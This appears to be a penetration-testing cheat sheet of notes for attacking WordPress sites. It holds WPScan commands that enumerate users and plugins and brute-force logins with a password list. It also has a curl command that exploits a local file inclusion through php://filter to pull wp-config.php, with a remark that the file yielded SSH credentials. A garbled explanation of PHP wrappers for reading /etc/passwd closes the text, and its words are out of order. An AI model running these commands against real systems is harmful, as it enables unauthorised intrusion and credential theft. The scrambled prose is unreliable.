
```
wpscan --url http://alvida-eatery.org/ --enumerate ap,u,t
```
#### WPScan

```c
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

Get wordpress config through LFI vuln, there were SSH creds in here...
```c
curl "172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php"| base64 -d > wp-config.php
```

PHP provides various wrappers, which can be used for easier access of files, protocols or streams.
A complete list of wrappers can be found here. The wrapper is enabled by default and is php:// used to interact with IO streams. For example: php://stdin and php://stdout can be used to  access  input and output streams for the process, while and are php://input php://output used to access  request data. A useful wrapper is , which can be chained with php://filter multiple filters to achieve  the desired output. For example, the filter reads the resource php://filter/read=/resource=/etc/passwd and outputs the contents. The filter can be used to  process the input with /etc/passwd read various string operations, such as base64 encoding, 
ROT13 encoding etc. The following filters will convert the contents of to base64 and ROT13 respectively.